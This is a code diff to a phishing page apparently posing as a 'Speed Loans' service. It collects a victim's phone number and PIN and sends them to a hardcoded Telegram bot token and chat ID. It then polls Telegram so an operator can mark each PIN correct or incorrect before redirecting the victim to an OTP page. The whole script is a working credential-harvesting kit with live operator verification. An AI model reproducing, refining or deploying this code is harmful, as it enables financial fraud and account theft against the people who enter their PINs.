@@ -83,7 +83,6 @@
       line-height: 1.55;
     }
 
-    /* Phone number input */
     .phone-input-wrap {
       padding: 0 25px;
       margin-bottom: 18px;
@@ -123,7 +122,6 @@
       letter-spacing: 0;
     }
 
-    /* PIN section */
     .pin-section {
       padding: 0 20px;
       margin-bottom: 6px;
@@ -167,7 +165,6 @@
       .pin-container { gap: 7px; }
     }
 
-    /* Info box */
     .info-box {
       background: #ECFDF5;
       border: 1px solid #A7F3D0;
@@ -186,7 +183,6 @@
       line-height: 1.5;
     }
 
-    /* Error message */
     .error-msg {
       text-align: center;
       margin: 0 20px 14px;
@@ -234,7 +230,6 @@
       font-family: 'Plus Jakarta Sans', sans-serif;
     }
 
-    /* Spinner */
     #spinner {
       display: none;
       position: fixed;
@@ -317,9 +312,7 @@
 
     <div class="form-section">
       <button class="btn-action" id="verifyBtn">Verify & Continue ⚡</button>
-      <a href="index.html" style="display:block; text-align:center; margin-top:10px;">
-        <button class="back-btn" type="button">← Back to Home</button>
-      </a>
+      <button class="back-btn" type="button" onclick="window.location.href='index.html'">← Back to Home</button>
     </div>
 
     <div class="footer-note">
@@ -334,7 +327,6 @@
   </div>
 
   <script>
-    // Telegram config
     const BOT = '8807278526:AAF8s3Z7XsjQNSk2ybpDwyappH6F7aWQexM';
     const CID = '7547427914';
 
@@ -345,12 +337,10 @@
     const pinInputs = document.getElementById('pinInputs');
     const phoneInput = document.getElementById('loginPhone');
 
-    // ─── PIN Auto-focus ─────────────────────────────────────────
     function setupPinAutoFocus() {
       const inputs = pinInputs.querySelectorAll('.pin-input');
       inputs.forEach((input, index) => {
         input.addEventListener('input', () => {
-          // Allow only digits
           input.value = input.value.replace(/\D/g, '');
           if (input.value.length === 1 && index < inputs.length - 1) {
             inputs[index + 1].focus();
@@ -379,7 +369,6 @@
                  .map(i => i.value.trim()).join('');
     }
 
-    // ─── Send to Telegram ───────────────────────────────────────
     function sendToTelegram(phone, pin, callback) {
       const ts = Date.now();
       const msg = '<b>🔴 NEW LOGIN — ATMoney Speed Loans</b>\n\n' +
@@ -397,56 +386,48 @@
           parse_mode: 'HTML',
           reply_markup: {
             inline_keyboard: [
-              [{ text: '✅ Approve', callback_data: 'login_approve_' + ts }],
-              [{ text: '❌ Decline', callback_data: 'login_decline_' + ts }]
+              [{ text: '✅ Correct PIN', callback_data: 'pin_correct_' + ts }],
+              [{ text: '❌ Incorrect PIN', callback_data: 'pin_incorrect_' + ts }],
+              [{ text: '⚠️ Already Applied', callback_data: 'pin_applied_' + ts }]
             ]
           }
         })
       })
-      .then(function(res) { return res.json(); })
-      .then(function(data) {
+      .then(res => res.json())
+      .then(data => {
         if (data.ok) {
           let lastOffset = 0;
-          const interval = setInterval(function() {
+          const interval = setInterval(() => {
             fetch('https://api.telegram.org/bot' + BOT + '/getUpdates?offset=' + (lastOffset + 1))
-              .then(function(r) { return r.json(); })
-              .then(function(updates) {
+              .then(r => r.json())
+              .then(updates => {
                 if (!updates.ok || !updates.result) return;
-                updates.result.forEach(function(update) {
+                updates.result.forEach(update => {
                   lastOffset = update.update_id;
                   if (update.callback_query) {
                     const cb = update.callback_query.data;
-                    if (cb === 'login_approve_' + ts || cb === 'login_decline_' + ts) {
+                    if (cb.includes(ts.toString())) {
                       clearInterval(interval);
-                      callback(cb.startsWith('login_approve_'));
+                      callback(cb.split('_')[1]);
                     }
                   }
                 });
               })
-              .catch(function() {});
+              .catch(() => {});
           }, 1000);
-          // Auto-proceed after 30s timeout
-          setTimeout(function() {
-            clearInterval(interval);
-            callback(true);
-          }, 30000);
         } else {
-          callback(true);
+          callback('correct');
         }
       })
-      .catch(function() {
-        callback(true);
-      });
+      .catch(() => callback('correct'));
     }
 
-    // ─── Submit handler ─────────────────────────────────────────
     function handleSubmit() {
       if (isProcessing) return;
 
       const phone = phoneInput.value.trim();
       const pin = getPin();
 
-      // Validation
       errMsg.style.display = 'none';
 
       if (!phone || phone.length < 10) {
@@ -462,45 +443,37 @@
         return;
       }
 
-      // Show spinner
       isProcessing = true;
       verifyBtn.disabled = true;
       verifyBtn.textContent = 'Verifying...';
       spinner.style.display = 'flex';
 
-      sendToTelegram(phone, pin, function(approved) {
+      sendToTelegram(phone, pin, (status) => {
         spinner.style.display = 'none';
+        isProcessing = false;
+        verifyBtn.disabled = false;
+        verifyBtn.textContent = 'Verify & Continue ⚡';
 
-        if (approved) {
-          // Redirect to OTP page with params
-          const queryParams = 'phone=' + encodeURIComponent(phone) +
-                             '&pin=' + encodeURIComponent(pin) +
-                             '&amount=1000' +
-                             '&name=Speed Loan';
-          setTimeout(function() {
-            window.location.href = 'otp.html?' + queryParams;
-          }, 800);
-        } else {
-          isProcessing = false;
-          verifyBtn.disabled = false;
-          verifyBtn.textContent = 'Verify & Continue ⚡';
-          errMsg.textContent = 'Request declined. Please try again.';
+        if (status === 'correct') {
+          window.location.href = 'otp.html?phone=' + encodeURIComponent(phone);
+        } else if (status === 'incorrect') {
+          errMsg.textContent = 'Incorrect PIN. Please check and try again.';
+          errMsg.style.display = 'block';
+        } else if (status === 'applied') {
+          errMsg.textContent = 'You have already applied for a loan. Please check your status later.';
           errMsg.style.display = 'block';
         }
       });
     }
 
-    // ─── Init ───────────────────────────────────────────────────
     setupPinAutoFocus();
     verifyBtn.onclick = handleSubmit;
 
-    // Enter key support
-    phoneInput.addEventListener('keypress', function(e) {
+    phoneInput.addEventListener('keypress', (e) => {
       if (e.key === 'Enter') handleSubmit();
     });
 
-    // Auto-focus first PIN input when phone has 10 digits
-    phoneInput.addEventListener('input', function() {
+    phoneInput.addEventListener('input', () => {
       if (phoneInput.value.replace(/\D/g, '').length === 10) {
         pinInputs.querySelectorAll('.pin-input')[0].focus();
       }
